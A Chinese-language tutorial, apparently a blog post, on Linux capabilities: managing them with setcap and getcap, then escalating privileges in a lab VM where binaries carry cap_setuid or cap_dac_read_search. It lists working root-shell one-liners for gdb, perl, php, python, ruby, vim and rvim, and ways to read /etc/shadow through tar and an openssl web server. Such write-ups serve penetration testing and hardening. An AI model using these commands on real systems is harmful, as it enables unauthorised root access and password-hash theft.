# **一、** ** **操作目的和应用场景****

Capabilities机制是在Linux内核2.2之后引入的，原理很简单，就是将之前与超级用户root（UID=0）关联的特权细分为不同的功能组，Capabilites作为线程（Linux并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。

这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是root，就去检查其是否具有该特权操作所对应的capabilities，并以此为依据，决定是否可以执行特权操作。

如果Capabilities设置不正确，就会让攻击者有机可乘，实现权限提升。

#  **二、** ** **平台及工具版本****

host系统：kali linux 2020

虚拟机管理程序：virtualbox

虚拟机：CentOS 7

#  **三、** ** **操作步骤****

###  **（一）** ** **Linux Capabilities管理****

 **1、** ** **Linux系统管理Capabilities的工具****

Linux系统中主要提供了两种工具来管理capabilities：libcap和libcap-ng。

libcap提供了getcap和setcap两个命令来分别查看和设置文件的capabilities，同时还提供了capsh来查看当前shell进程的capabilities。

libcap-ng更易于使用，使用同一个命令filecap来查看和设置capabilities。

 **2、** ** **Capabilities的管理方法****

（1）设置Capability

举个例子，安装wireshark软件后，默认情况下，普通用户无法对网卡实施抓包操作。这是因为普通用户不具备相应的权限。

![1601293723_5f71cd9b3080a7720276a.png!small](https://image.3001.net/images/20200928/1601293723_5f71cd9b3080a7720276a.png!small)

为解决此问题，可以为/usr/bin/dumpcap文件授予抓包相关的capabilities：

setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap

![1601293773_5f71cdcd84d262dff64ed.png!small](https://image.3001.net/images/20200928/1601293773_5f71cdcd84d262dff64ed.png!small)

命令执行后重新启动wireshark，就可以抓包了。

（2）查看文件的Capability

getcap /usr/bin/dumpcap //查看文件的capabilities

![1601293798_5f71cde627f0226cd31b6.png!small](https://image.3001.net/images/20200928/1601293798_5f71cde627f0226cd31b6.png!small)

（3）删除文件的capabilities

setcap -r /usr/bin/dumpcap

![1601293845_5f71ce15c309e12feadd0.png!small](https://image.3001.net/images/20200928/1601293845_5f71ce15c309e12feadd0.png!small)

###  **（二）利用** ** **Capabilities实现权限提升****

现在假设管理员对一些可执行文件设置了capabilities。测试人员通过下面的命令查找这些文件：

getcap -r / 2>/dev/null

![1601293875_5f71ce33e8f804026f67e.png!small](https://image.3001.net/images/20200928/1601293875_5f71ce33e8f804026f67e.png!small)

之后我们针对其中的一部分程序尝试提权。

请大家注意，从上面查找结果中可以看到，很多文件的capability被设置为cap_setuid。但是文件capabilities中的cap_setuid和文件的suid标志位之间是没有关系的：

![1601293897_5f71ce490b8cc16c190dc.png!small](https://image.3001.net/images/20200928/1601293897_5f71ce490b8cc16c190dc.png!small)

设置了cap_setuid的capability的文件并没有设置suid。

![1601293907_5f71ce536c23445528dae.png!small](https://image.3001.net/images/20200928/1601293907_5f71ce536c23445528dae.png!small)

设置了suid的程序也不拥有cap_setuid的capability。

 **1、** ** **gdb****

gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit

![1601293919_5f71ce5fdfc7f607c5c4a.png!small](https://image.3001.net/images/20200928/1601293919_5f71ce5fdfc7f607c5c4a.png!small)

提权成功，获取了root shell。

 **2、** ** **perl****

perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

![1601293931_5f71ce6ba6788dbc6149f.png!small](https://image.3001.net/images/20200928/1601293931_5f71ce6ba6788dbc6149f.png!small)

提权成功，获取了root shell。

 **3、** ** **php****

php -r "posix_setuid(0); system('/bin/sh');"

![1601293944_5f71ce786a1144b3805f8.png!small](https://image.3001.net/images/20200928/1601293944_5f71ce786a1144b3805f8.png!small)

在kali linux上提权成功，获取了root shell。

在CentOS 7系统中安装的低版本php无法提权：

![1601293955_5f71ce833f0f0ff393c0d.png!small](https://image.3001.net/images/20200928/1601293955_5f71ce833f0f0ff393c0d.png!small)

 **4、** ** **python****

python -c 'import os; os.setuid(0); os.system("/bin/sh")'

![1601293975_5f71ce9727ec5afc3c161.png!small](https://image.3001.net/images/20200928/1601293975_5f71ce9727ec5afc3c161.png!small)

提权成功，获取了root shell。

 **5、** ** **ruby****

ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'

![1601293986_5f71cea209126de6ea847.png!small](https://image.3001.net/images/20200928/1601293986_5f71cea209126de6ea847.png!small)

提权成功，获取了root shell。

 **6、** ** **rvim****

rvim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset;
exec sh")'

![1601293995_5f71ceaba9bacf6a6db38.png!small](https://image.3001.net/images/20200928/1601293995_5f71ceaba9bacf6a6db38.png!small)

执行后获取root shell：

![1601294008_5f71ceb8b88ff36a4b247.png!small](https://image.3001.net/images/20200928/1601294008_5f71ceb8b88ff36a4b247.png!small)

 **7、** ** **vim****

vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset;
exec sh")'

![1601294027_5f71cecbe8eeaa28b0574.png!small](https://image.3001.net/images/20200928/1601294027_5f71cecbe8eeaa28b0574.png!small)

执行后获得root shell：

![1601294037_5f71ced5c86e8ee1db539.png!small](https://image.3001.net/images/20200928/1601294037_5f71ced5c86e8ee1db539.png!small)

###  **8、** ** **tar****

![1601294052_5f71cee408ab0c9908835.png!small](https://image.3001.net/images/20200928/1601294052_5f71cee408ab0c9908835.png!small)

cap_dac_read_search可以绕过文件的读权限检查以及目录的读/执行权限的检查。

利用此特性我们可以读取系统中的敏感信息。

tar cvf shadow.tar /etc/shadow //创建压缩文件

tar -xvf shadow.tar //解压缩

cd etc //进入解压缩的目录

chmod +r shadow //赋予读权限

cat shadow | grep root //查看shadow文件的内容

![1601294116_5f71cf24cc040a3f53304.png!small](https://image.3001.net/images/20200928/1601294116_5f71cf24cc040a3f53304.png!small)

这样就读取了/etc/shadow文件的内容，zip等程序也可以达到相同的目标，过程不再赘述。

 **9、** ** **openssl****

![1601294182_5f71cf662718e6a92417c.png!small](https://image.3001.net/images/20200928/1601294182_5f71cf662718e6a92417c.png!small)

可以看到，openssl的capability被设置为空。下面我们尝试使用openssl读取/etc/shadow文件。

//使用openssl生成证书

cd /tmp

openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
-nodes

//启动web服务器，监听1337端口

cd /

openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP

//访问本机的web服务，读取/etc/shadow文件

curl -k "https://127.0.0.1:1337/etc/shadow"

![1601294292_5f71cfd4b665c2a5a3b05.png!small](https://image.3001.net/images/20200928/1601294292_5f71cfd4b665c2a5a3b05.png!small)

提权成功。

#  **四、** ** **参考网址****

> <https://gtfobins.github.io/>
>
> [ _https://www.hackingarticles.in/linux-privilege-escalation-using-> capabilities/_](https://www.hackingarticles.in/linux-privilege-escalation-> using-capabilities/)
>
> [ _https://medium.com/@int0x33/day-44-linux-capabilities-privilege-> escalation-via-openssl-with-selinux-enabled-and-> enforced-74d2bec02099_](https://medium.com/@int0x33/day-44-linux-> capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-> enforced-74d2bec02099)

